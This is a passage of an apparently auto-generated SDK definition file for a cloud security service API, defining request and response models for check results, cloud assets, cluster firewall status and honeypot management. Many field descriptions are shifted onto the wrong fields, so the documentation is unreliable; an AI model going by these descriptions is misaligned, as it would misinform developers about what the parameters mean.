    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='100'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='F9B6DD67-B289-5406-B35C-B0F4A217S23'),
}

model ListCheckResultResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListCheckResultResponseBody(name='body'),
}

async function listCheckResultWithOptions(request: ListCheckResultRequest, runtime: Util.RuntimeOptions): ListCheckResultResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkKey)) {
    query['CheckKey'] = request.checkKey;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.instanceIds)) {
    query['InstanceIds'] = request.instanceIds;
  }
  if (!Util.isUnset(request.instanceTypes)) {
    query['InstanceTypes'] = request.instanceTypes;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.regionId)) {
    query['RegionId'] = request.regionId;
  }
  if (!Util.isUnset(request.requirementIds)) {
    query['RequirementIds'] = request.requirementIds;
  }
  if (!Util.isUnset(request.riskLevels)) {
    query['RiskLevels'] = request.riskLevels;
  }
  if (!Util.isUnset(request.sortTypes)) {
    query['SortTypes'] = request.sortTypes;
  }
  if (!Util.isUnset(request.standardIds)) {
    query['StandardIds'] = request.standardIds;
  }
  if (!Util.isUnset(request.statuses)) {
    query['Statuses'] = request.statuses;
  }
  if (!Util.isUnset(request.types)) {
    query['Types'] = request.types;
  }
  if (!Util.isUnset(request.vendors)) {
    query['Vendors'] = request.vendors;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListCheckResult',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listCheckResult(request: ListCheckResultRequest): ListCheckResultResponse {
  var runtime = new Util.RuntimeOptions{};
  return listCheckResultWithOptions(request, runtime);
}

model ListCheckStandardRequest {
  instanceIds?: [ string ](name='InstanceIds'),
  instanceSubTypes?: [ string ](name='InstanceSubTypes'),
  instanceTypes?: [ string ](name='InstanceTypes'),
  lang?: string(name='Lang', example='zh'),
  vendors?: [ string ](name='Vendors'),
}

model ListCheckStandardResponseBody = {
  requestId?: string(name='RequestId', example='FA91FBDA-***'),
  standards?: [ 
    {
      id?: long(name='Id', example='1'),
      requirements?: [ 
        {
          id?: long(name='Id', example='11'),
          riskCheckCount?: long(name='RiskCheckCount', example='10'),
          showName?: string(name='ShowName'),
        }
      ](name='Requirements'),
      showName?: string(name='ShowName'),
      type?: string(name='Type', example='IDENTITY_PERMISSION'),
    }
  ](name='Standards'),
}

model ListCheckStandardResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListCheckStandardResponseBody(name='body'),
}

async function listCheckStandardWithOptions(request: ListCheckStandardRequest, runtime: Util.RuntimeOptions): ListCheckStandardResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.instanceIds)) {
    query['InstanceIds'] = request.instanceIds;
  }
  if (!Util.isUnset(request.instanceSubTypes)) {
    query['InstanceSubTypes'] = request.instanceSubTypes;
  }
  if (!Util.isUnset(request.instanceTypes)) {
    query['InstanceTypes'] = request.instanceTypes;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.vendors)) {
    query['Vendors'] = request.vendors;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListCheckStandard',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listCheckStandard(request: ListCheckStandardRequest): ListCheckStandardResponse {
  var runtime = new Util.RuntimeOptions{};
  return listCheckStandardWithOptions(request, runtime);
}

model ListClientUserDefineRuleTypesResponseBody = {
  requestId?: string(name='RequestId', example='340D7FC4-D575-1661-8ACD-CFA7BE57****'),
  userDefineRuleTypes?: [ string ](name='UserDefineRuleTypes'),
}

model ListClientUserDefineRuleTypesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListClientUserDefineRuleTypesResponseBody(name='body'),
}

async function listClientUserDefineRuleTypesWithOptions(runtime: Util.RuntimeOptions): ListClientUserDefineRuleTypesResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'ListClientUserDefineRuleTypes',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listClientUserDefineRuleTypes(): ListClientUserDefineRuleTypesResponse {
  var runtime = new Util.RuntimeOptions{};
  return listClientUserDefineRuleTypesWithOptions(runtime);
}

model ListClientUserDefineRulesRequest {
  currentPage?: int32(name='CurrentPage', example='1'),
  name?: string(name='Name'),
  pageSize?: int32(name='PageSize', example='10'),
  type?: [ int32 ](name='Type'),
}

model ListClientUserDefineRulesResponseBody = {
  pageInfo?: {
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='69'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB393***'),
  userDefineRuleList?: [ 
    {
      actionType?: int32(name='ActionType', example='0'),
      id?: long(name='Id', example='200****'),
      name?: string(name='Name'),
      platform?: string(name='Platform', example='linux'),
      switchId?: string(name='SwitchId', example='USER-DEFINE-RULE-SWITCH-TYPE_200****'),
      type?: int32(name='Type', example='1'),
    }
  ](name='UserDefineRuleList'),
}

model ListClientUserDefineRulesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListClientUserDefineRulesResponseBody(name='body'),
}

async function listClientUserDefineRulesWithOptions(request: ListClientUserDefineRulesRequest, runtime: Util.RuntimeOptions): ListClientUserDefineRulesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListClientUserDefineRules',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listClientUserDefineRules(request: ListClientUserDefineRulesRequest): ListClientUserDefineRulesResponse {
  var runtime = new Util.RuntimeOptions{};
  return listClientUserDefineRulesWithOptions(request, runtime);
}

model ListCloudAssetInstancesRequest {
  cloudAssetTypes?: [ 
    {
      assetSubType?: int32(name='AssetSubType', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='0'),
      assetType?: int32(name='AssetType', description='The subtype of the cloud asset.

You can call the [GetCloudAssetCriteria](~~GetCloudAssetCriteria~~) operation to query the subtypes of cloud assets from the AssetSubType response parameter.', example='18'),
    }
  ](name='CloudAssetTypes', description='The cloud service asset.'),
  criteria?: string(name='Criteria', description='The logical relation for multiple search conditions. Valid values:

*   **OR**: The search conditions use a logical **OR**.
*   **AND**: The search conditions use a logical **AND**.', example='[{\\"name\\":\\"internetIp\\",\\"value\\":\\"192.168\\",\\"logicalExp\\":\\"OR\\"}]'),
  currentPage?: int32(name='CurrentPage', description='The cloud service assets.', example='2'),
  logicalExp?: string(name='LogicalExp', description='The number of entries to return on each page. Maximum value: 100. Default value: 20.', example='OR'),
  pageSize?: int32(name='PageSize', description='The number of the page to return.', example='20'),
  regionId?: string(name='RegionId', description='The search conditions for assets. The value of this parameter is in the JSON format and contains the following fields:

*   **name**: the name of the search condition.

*   **value**: the value of the search condition.

*   **logicalExp**: the logical relation for multiple search conditions. Valid values:

    *   **OR**: The search conditions use a logical **OR**.
    *   **AND**: The search conditions use a logical **AND**.

> You can call the [GetCloudAssetCriteria](~~GetCloudAssetCriteria~~) operation to query supported search conditions.', example='cn-hangzhou'),
}

model ListCloudAssetInstancesResponseBody = {
  instances?: [ 
    {
      alarmStatus?: string(name='AlarmStatus', description='Indicates whether risks are detected on the cloud asset. Valid values:

*   **YES**
*   **NO**', example='NO'),
      assetSubType?: string(name='AssetSubType', description='The instance ID of the cloud asset.', example='0'),
      assetSubTypeName?: string(name='AssetSubTypeName', description='The security information about the cloud asset.', example='SECURITY_GROUP'),
      assetType?: int32(name='AssetType', description='The subtype of the cloud asset. The subtype of the cloud service. Valid values:

*   **0**: ECS
    * **0**: instance
    * **1**: disk (storage)
    * **2**: security group
*   **1**: SLB
    * **0**: SLB
    * **1**: Application Load Balancer (ALB)
*   **3**: ApsaraDB RDS
    * **0**: instance
*   **4**: MongoDB
    * **0**: instance
*   **5**: Redis
    * **0**: instance
*   **6**: Container Registry
    * **1**: Enterprise Edition
    * **2**: Personal Edition
*   **8**: ACK
    * **0**: cluster
*   **9**: VPC
    * **0**: NAT gateway
    * **1**:EIP
    * **2**:VPN
    * **3**:FLOW_LOG
*   **11**: ActionTrail
    * **0**: trail
*   **12**: CDN
    * **0**: instance
*   **13**: Certificate Management Service (formerly SSL Certificates Service)
     * **0**: certificate
*   **14**: Apsara Devops
    * **0**: organization
*   **16**: Anti-DDoS
    * **0**: instance
*   **17**: WAF
    * **0**: domain name
*   **18**: OSS
    * **0**:Bucket
*   **19**: PolarDB
    * **0**: cluster
*   **20**: ApsaraDB RDS for PostgreSQL
    * **0**: instance
*   **21**: MSE
    * **0**: cluster
*   **22**: NAS
    * **0**: file system
*   **23**: DSC
    * **0**: instance
*   **24**: EIP
    * **0**: Anycast EIP
*   **25**: IDaaS EIAM
    * **0**: instance
*   **26**: PolarDB-X
    * **0**: instance
*   **27**: Elasticsearch
    * **0**: instance', example='0'),
      assetTypeName?: string(name='AssetTypeName', description='The subtype name of the cloud asset.', example='ECS'),
      createdTime?: long(name='CreatedTime', description='The public IP address of the instance.', example='1607365213000'),
      instanceId?: string(name='InstanceId', description='The instance name of the cloud asset.', example='d-uf60vevzkztnflx7cny5'),
      instanceName?: string(name='InstanceName', description='The time when the instance was created.', example='yztest-l***'),
      internetIp?: string(name='InternetIp', description='Indicates whether alerts are generated for the cloud asset. Valid values:

*   **YES**
*   **NO**', example='1.2.XX.XX'),
      regionId?: string(name='RegionId', description='The type of the cloud asset by source. Valid values:

*   **0**: an asset provided by Alibaba Cloud
*   **1**: a third-party cloud asset
*   **2**: an asset in a data center
*   **3**, **4**, **5**, and **7**: other cloud asset
*   **8**: a lightweight asset', example='cn-hanghzou'),
      riskStatus?: string(name='RiskStatus', description='The type name of the cloud asset.', example='NO'),
      securityInfo?: string(name='SecurityInfo', example='{"seriousNum":0,"appNum":0,"baselineMedium":0,"remindNum":0,"imageVulNntf":0,"cveNum":0,"vul":0,"uuid":"yuejia-test","emgNum":0,"weakPWNum":0,"imageMaliciousFileRemind":0,"imageBaselineMedium":0,"laterVulCount":0,"cmsNum":0,"imageMaliciousFileSerious":0,"agentlessMalicious":0,"suspNum":0,"imageBaselineHigh":0,"asapVulCount":0,"imageVulLater":0,"agentlessAll":0,"sysNum":0,"containerLater":0,"containerSuspicious":0,"imageBaselineNum":0,"newSuspicious":0,"nntfVulCount":0,"scaNum":0,"containerNntf":0,"health":0,"trojan":0,"suspicious":0,"imageMaliciousFileSuspicious":0,"containerRemind":0,"baselineLow":0,"imageVulAsap":0,"imageBaselineLow":0,"containerAsap":0,"agentlessBaseline":0,"agentlessVulSca":0,"agentlessVulCve":0,"containerSerious":0,"baselineHigh":0,"account":0,"baselineNum":5}'),
      vendor?: int32(name='Vendor', description='The type of the asset. Valid values:

*   **0**: Elastic Compute Service (ECS)
*   **1**: Server Load Balancer (SLB)
*   **3**: ApsaraDB RDS
*   **4**: ApsaraDB for MongoDB (MongoDB)
*   **5**: ApsaraDB for Redis (Redis)
*   **6**: Container Registry
*   **8**: Container Service for Kubernetes (ACK)
*   **9**: Virtual Private Cloud (VPC)
*   **11**: ActionTrail
*   **12**: Alibaba Cloud CDN (CDN)
*   **13**: Certificate Management Service (formerly SSL Certificates Service)
*   **14**: Apsara Devops
*   **16**: Anti-DDoS
*   **17**: Web Application Firewall (WAF)
*   **18**: Object Storage Service (OSS)
*   **19**: PolarDB
*   **20**: ApsaraDB RDS for PostgreSQL
*   **21**: Microservices Engine (MSE)
*   **22**: Apsara File Storage NAS (NAS)
*   **23**: Data Security Center (DSC)
*   **24**: Elastic IP Address (EIP)
*   **25**: IDaaS EIAM
*   **26**: PolarDB-X
*   **27**: Elasticsearch', example='0'),
    }
  ](name='Instances', description='The details of the cloud asset.'),
  pageInfo?: {
    count?: int32(name='Count', description='An array that consists of the details of the cloud assets.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The number of entries returned per page.', example='2'),
    pageSize?: int32(name='PageSize', description='The total number of cloud assets.', example='100'),
    totalCount?: int32(name='TotalCount', description='The number of entries returned on the current page.', example='69'),
  }(name='PageInfo', description='The page number of the returned page.'),
  requestId?: string(name='RequestId', description='The pagination information.', example='028CF634-5268-5660-9575-48C9ED6BF880'),
  success?: boolean(name='Success', description='The ID of the request, which is used to locate and troubleshoot issues.', example='true'),
}

model ListCloudAssetInstancesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListCloudAssetInstancesResponseBody(name='body'),
}

async function listCloudAssetInstancesWithOptions(request: ListCloudAssetInstancesRequest, runtime: Util.RuntimeOptions): ListCloudAssetInstancesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.cloudAssetTypes)) {
    query['CloudAssetTypes'] = request.cloudAssetTypes;
  }
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.logicalExp)) {
    query['LogicalExp'] = request.logicalExp;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.regionId)) {
    query['RegionId'] = request.regionId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListCloudAssetInstances',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listCloudAssetInstances(request: ListCloudAssetInstancesRequest): ListCloudAssetInstancesResponse {
  var runtime = new Util.RuntimeOptions{};
  return listCloudAssetInstancesWithOptions(request, runtime);
}

model ListClusterCnnfStatusDetailRequest {
  clusterIds?: [ string ](name='ClusterIds', description='An array that consists of the protection status of the container firewall.'),
}

model ListClusterCnnfStatusDetailResponseBody = {
  data?: [ 
    {
      clusterId?: string(name='ClusterId', description='Indicates whether the container firewall plug-in is installed.', example='c8ca91e0907d94efaba7fb0827eb9****'),
      installed?: boolean(name='Installed', description='The machine type of the instance. The value is fixed as **ecs**.', example='true'),
      instanceId?: string(name='InstanceId', description='The online status of the plug-in. Valid values:

*   **false**: The plug-in is offline.
*   **true**: The plug-in is online.', example='i-bp180bogui4fc0z4****'),
      internetIp?: string(name='InternetIp', description='The cause why the plug-in is invalid. Valid values:

*   **PLUGIN_OFFLINE**: The plug-in is offline.
*   **PLUGIN\\_NOT_INSTALLED**: The plug-in is not installed.
*   **PLUGIN\\_INVALID_VERSION**: The version of the plug-in is invalid.', example='172.16.XX.XX'),
      intranetIp?: string(name='IntranetIp', example='10.42.XX.XX'),
      invalidType?: string(name='InvalidType', example='PLUGIN_OFFLINE'),
      machineName?: string(name='MachineName', description='The public IP address of the associated instance.', example='security'),
      machineType?: int32(name='MachineType', example='ecs'),
      pluginName?: string(name='PluginName', description='The private IP address of the associated instance.', example='alinet'),
      pluginVersion?: string(name='PluginVersion', example='3.3'),
      status?: string(name='Status', description='The version of the plug-in.', example='false'),
      uuid?: string(name='Uuid', description='The name of the plug-in. The value is fixed as **alinet**.', example='6690a46c-0edb-4663-a641-3629d1a9****'),
    }
  ](name='Data', description='The ID of the server.'),
  requestId?: string(name='RequestId', description='The ID of the cluster.', example='64329F40-5C94-51D3-A400-37AA7BAC****'),
}

model ListClusterCnnfStatusDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListClusterCnnfStatusDetailResponseBody(name='body'),
}

async function listClusterCnnfStatusDetailWithOptions(request: ListClusterCnnfStatusDetailRequest, runtime: Util.RuntimeOptions): ListClusterCnnfStatusDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterIds)) {
    query['ClusterIds'] = request.clusterIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListClusterCnnfStatusDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listClusterCnnfStatusDetail(request: ListClusterCnnfStatusDetailRequest): ListClusterCnnfStatusDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return listClusterCnnfStatusDetailWithOptions(request, runtime);
}

model ListClusterInterceptionConfigRequest {
  clusterCNNFStatus?: int32(name='ClusterCNNFStatus', example='1'),
  clusterId?: string(name='ClusterId', example='c22143730ab6e40b09ec7c1c51d4d****'),
  clusterName?: string(name='ClusterName', example='sas'),
  currentPage?: int32(name='CurrentPage', example='1'),
  pageSize?: int32(name='PageSize', example='20'),
}

model ListClusterInterceptionConfigResponseBody = {
  clusterConfigList?: [ 
    {
      clusterCNNFStatus?: int32(name='ClusterCNNFStatus', example='0'),
      clusterId?: string(name='ClusterId', example='c9051d30d8a044b4d99e1cb5d25ac****'),
      clusterName?: string(name='ClusterName', example='container-opa-kill-02'),
      clusterType?: string(name='ClusterType', example='ManagedKubernetes'),
      interceptionSwitch?: int32(name='InterceptionSwitch', example='1'),
      openRuleCount?: long(name='OpenRuleCount', example='12'),
      supportCNNF?: boolean(name='SupportCNNF', example='false'),
      totalRuleCount?: long(name='TotalRuleCount', example='123'),
    }
  ](name='ClusterConfigList'),
  pageInfo?: {
    count?: int32(name='Count', example='11'),
    currrentPage?: int32(name='CurrrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='11'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='49FDE92F-A0B8-56CC-B7A8-23B17646****'),
}

model ListClusterInterceptionConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListClusterInterceptionConfigResponseBody(name='body'),
}

async function listClusterInterceptionConfigWithOptions(request: ListClusterInterceptionConfigRequest, runtime: Util.RuntimeOptions): ListClusterInterceptionConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterCNNFStatus)) {
    query['ClusterCNNFStatus'] = request.clusterCNNFStatus;
  }
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.clusterName)) {
    query['ClusterName'] = request.clusterName;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListClusterInterceptionConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listClusterInterceptionConfig(request: ListClusterInterceptionConfigRequest): ListClusterInterceptionConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return listClusterInterceptionConfigWithOptions(request, runtime);
}

model ListHoneypotRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1'),
  honeypotIds?: [ string ](name='HoneypotIds', description='The IDs of the honeypots.'),
  honeypotName?: string(name='HoneypotName', description='The name of the honeypot.', example='mx-rouyi'),
  nodeId?: string(name='NodeId', description='The ID of the management node.', example='a882e590-b87b-45a6-87b9-d0a3e5a0****'),
  nodeName?: string(name='NodeName', description='The name of the management node.', example='honeypot_master'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='20'),
}

model ListHoneypotResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  list?: [ 
    {
      controlNodeName?: string(name='ControlNodeName', description='The name of the management node.', example='0804-pre'),
      honeypotId?: string(name='HoneypotId', description='The ID of the honeypot.', example='76c2a1c72ef259777d96d55a7834e5f5d98f85666c49f76ad9caa447d8b7****'),
      honeypotImageDisplayName?: string(name='HoneypotImageDisplayName', description='The display name of the honeypot image.', example='MongoDB'),
      honeypotImageId?: string(name='HoneypotImageId', description='The ID of the honeypot image.', example='sha256:eca5ced3757e46c24701e9ced4e652f2d730262d5685a4e001da22c4fb418fd4'),
      honeypotImageName?: string(name='HoneypotImageName', description='The name of the honeypot image.', example='tcp_proxy'),
      honeypotName?: string(name='HoneypotName', description='The name of the honeypot.', example='mx-rouyi'),
      nodeId?: string(name='NodeId', description='The ID of the management node.', example='c94eff5b-ea48-4805-8b7f-e04d3509b117'),
      presetId?: string(name='PresetId', description='The ID of the custom configuration for the honeypot.', example='a882e590-b87b-45a6-87b9-d0a3e5a0****'),
      state?: [ string ](name='State', description='An array that consists of the status information about the honeypot.'),
    }
  ](name='List', description='An array that consists of the information about the honeypots.'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='69'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='C80AFF1F-CC20-502C-A4D4-F5433E529B69'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model ListHoneypotResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListHoneypotResponseBody(name='body'),
}

async function listHoneypotWithOptions(request: ListHoneypotRequest, runtime: Util.RuntimeOptions): ListHoneypotResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.honeypotIds)) {
    query['HoneypotIds'] = request.honeypotIds;
  }
  if (!Util.isUnset(request.honeypotName)) {
    query['HoneypotName'] = request.honeypotName;
  }
  if (!Util.isUnset(request.nodeId)) {
    query['NodeId'] = request.nodeId;
  }
  if (!Util.isUnset(request.nodeName)) {
    query['NodeName'] = request.nodeName;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListHoneypot',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listHoneypot(request: ListHoneypotRequest): ListHoneypotResponse {
  var runtime = new Util.RuntimeOptions{};
  return listHoneypotWithOptions(request, runtime);
}

model ListHoneypotAlarmEventsRequest {
  currentPage?: int32(name='CurrentPage', description='The number of entries to return on each page. Default value: **100**', example='10'),
  dealed?: string(name='Dealed', description='The source IP address.', example='n'),
  dstIp?: string(name='DstIp', description='The risk levels of the alert events.', example='172.20.XX.XX'),
  pageSize?: int32(name='PageSize', description='The data returned.', example='10'),
  riskLevelList?: [ string ](name='RiskLevelList', description='The risk level. Valid values:

*   **2**: low
*   **3**: medium
*   **4**: high'),
  srcIp?: string(name='SrcIp', description='The destination IP address.', example='101.132.XX.XX'),
}

model ListHoneypotAlarmEventsResponseBody = {
  honeypotAlarmEvents?: [ 
    {
      alarmEventId?: long(name='AlarmEventId', description='The type of the alert event.', example='940272'),
      alarmEventName?: string(name='AlarmEventName', description='The unique identifier of the alert event.', example='Attack Honeypot'),
      alarmEventType?: string(name='AlarmEventType', description='The name of the alert event.', example='Initial Access'),
      alarmUniqueInfo?: string(name='AlarmUniqueInfo', description='The timestamp when the alert event was first generated. Unit: milliseconds.', example='167e6fc0d931917d2059efcd1d00f6ab'),
      eventCount?: int32(name='EventCount', description='The handling status of the alert event. Valid values:

*   **1**: pending
*   **2**: ignored
*   **4**: confirmed', example='11'),
      firstTime?: long(name='FirstTime', description='The timestamp when the alert event was last generated. Unit: milliseconds.', example='1658193602000'),
      lastTime?: long(name='LastTime', description='The risk level of the alert event. Valid values:

*   **2**: low
*   **3**: medium
*   **4**: high', example='1660610772000'),
      mergeFieldList?: [ 
        {
          fieldExtInfo?: string(name='FieldExtInfo', description='The pagination information.', example='dest_ip_ext'),
          fieldKey?: string(name='FieldKey', description='The value that corresponds to the field key.', example='dest_ip_count'),
          fieldType?: string(name='FieldType', description='The key of the field.', example='level1_item3'),
          fieldValue?: string(name='FieldValue', description='The extended value that corresponds to the field key.', example='1'),
        }
      ](name='MergeFieldList', description='The information about the array object.'),
      operateStatus?: int32(name='OperateStatus', description='The risk information.', example='1'),
      riskLevel?: string(name='RiskLevel', description='The total number of times that the alert event was generated.', example='2'),
    }
  ](name='HoneypotAlarmEvents', description='The information about the array object.'),
  pageInfo?: {
    count?: int32(name='Count', description='The request ID.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The number of entries returned per page. Default value: **100**', example='1'),
    pageSize?: int32(name='PageSize', description='The total number of entries returned.', example='20'),
    totalCount?: int32(name='TotalCount', description='The number of entries returned on the current page.', example='69'),
  }(name='PageInfo', description='The page number of the returned page.'),
  requestId?: string(name='RequestId', example='513C9554-55A4-5504-B7C4-6E17EB4FC7A3'),
}

model ListHoneypotAlarmEventsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListHoneypotAlarmEventsResponseBody(name='body'),
}

async function listHoneypotAlarmEventsWithOptions(request: ListHoneypotAlarmEventsRequest, runtime: Util.RuntimeOptions): ListHoneypotAlarmEventsResponse {
  Util.validateModel(request);
  var query = OpenApiUtil.query(Util.toMap(request));
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListHoneypotAlarmEvents',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'GET',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listHoneypotAlarmEvents(request: ListHoneypotAlarmEventsRequest): ListHoneypotAlarmEventsResponse {
  var runtime = new Util.RuntimeOptions{};
  return listHoneypotAlarmEventsWithOptions(request, runtime);
}

model ListHoneypotNodeRequest {
  currentPage?: int32(name='CurrentPage', description='The allowed CIDR block.', example='1'),
  nodeId?: string(name='NodeId', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='7d110ca6-05ee-4149-8042-13ad1a41fd****'),
  nodeName?: string(name='NodeName', description='The name of the management node.', example='cyct_cnymu'),
  pageSize?: int32(name='PageSize', description='The time when the management node was created.', example='20'),
}

model ListHoneypotNodeResponseBody = {
  code?: string(name='Code', description='Queries the information about management nodes.', example='200'),
  honeypotNodeList?: [ 
    {
      allowHoneypotAccessInternet?: boolean(name='AllowHoneypotAccessInternet', description='The maximum number of probes that can be used.', example='true'),
      createTime?: string(name='CreateTime', description='The ID of the management node.', example='2022-08-04 15:52:56'),
      defaultNode?: boolean(name='DefaultNode', description='The number of entries returned on the current page.', example='false'),
      ecsInstanceId?: string(name='EcsInstanceId', description='The HTTP status code returned.', example='i-bp1fs3qsc1msa3512k****'),
      honeypotTotalCount?: int32(name='HoneypotTotalCount', description='The ID of the management node.', example='10'),
      honeypotUsedCount?: int32(name='HoneypotUsedCount', description='The maximum number of honeypots that can be deployed on the management node.', example='2'),
      nodeId?: string(name='NodeId', description='The name of the management node.', example='7d110ca6-05ee-4149-8042-13ad1a41fd****'),
      nodeIp?: string(name='NodeIp', description='The pagination information.', example='119.180.XX.XX'),
